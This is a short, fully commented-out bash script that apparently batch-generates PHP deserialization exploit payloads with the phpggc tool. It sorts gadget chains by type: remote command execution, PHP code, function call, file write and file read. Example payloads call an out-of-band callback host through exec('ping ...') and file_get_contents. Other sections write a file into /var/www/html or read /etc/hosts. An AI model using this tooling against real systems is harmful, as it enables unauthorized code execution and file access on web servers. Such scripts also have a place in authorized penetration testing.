#! /usr/bin/bash


# Adding new gadgets to our list:
# cat allggc.txt|grep "RCE (Command)" | sed 's/ .*//' >> command_ggc.txt

# -------------------------------------------------------------------
# *** PHP code *** 
# cat allggc.txt|grep "PHP code" | sed 's/ .*//' >> phpcode.txt

# while getopts 'l:p:o:' flag; do
#   case "${flag}" in
#     l) list="${OPTARG}";;
#     p) payload="${OPTARG}";;
#     o) output="${OPTARG}";;
#   esac
# done

# # -p "exec('ping -c 4 ck37jm8f8r9vilqcfju0pn5u5rr4qrb9o.oast.online');" 
# # -p "file_get_contents('https://ck37jm8f8r9vilqcfju0pn5u5rr4qrb9o.oast.online');"
# while IFS= read -r line
# do 
#      phpggc -s "$line" "$payload" >> "$output"
# done < "$list"




# -------------------------------------------------------------------

# *** Command *** 
# cat allggc.txt|grep "RCE (Command)" | sed 's/ .*//' >> command_ggc.txt


# while getopts 'l:p:o:' flag; do
#   case "${flag}" in
#     l) list="${OPTARG}";;
#     p) payload="${OPTARG}";;
#     o) output="${OPTARG}";;
#   esac
# done

# while IFS= read -r line
# do 
#      phpggc -s "$line" "$payload" >> "$output"
# done < "$list"
# -------------------------------------------------------------------

# *** function_call_ggc ***
# cat allggc.txt|grep "RCE (Function call)" | sed 's/ .*//' >> function-call.txt

# while getopts 'l:p:o:' flag; do
#   case "${flag}" in
#     l) list="${OPTARG}";;
#     p) payload="${OPTARG}";;
#     o) output="${OPTARG}";;
#   esac
# done

# while IFS= read -r line
# do 
#      phpggc -s "$line" exec "$payload" >> "$output"
# done < "$list"

# -------------------------------------------------------------------

# *** File write ***
# while getopts 'l:o:' flag; do
#   case "${flag}" in
#     l) list="${OPTARG}";;
#     o) output="${OPTARG}";;
#   esac
# done

# while IFS= read -r line
# do 
#      phpggc -s "$line" /var/www/html/snoopy.txt ~/PATH/PATH/snoopy.txt >> "$output"
# done < "$list"
# -------------------------------------------------------------------

# *** File read ***
# while getopts 'l:o:' flag; do
#   case "${flag}" in
#     l) list="${OPTARG}";;
#     o) output="${OPTARG}";;
#   esac
# done

# while IFS= read -r line
# do 
#      phpggc -s "$line" /etc/hosts >> "$output"
# done < "$list"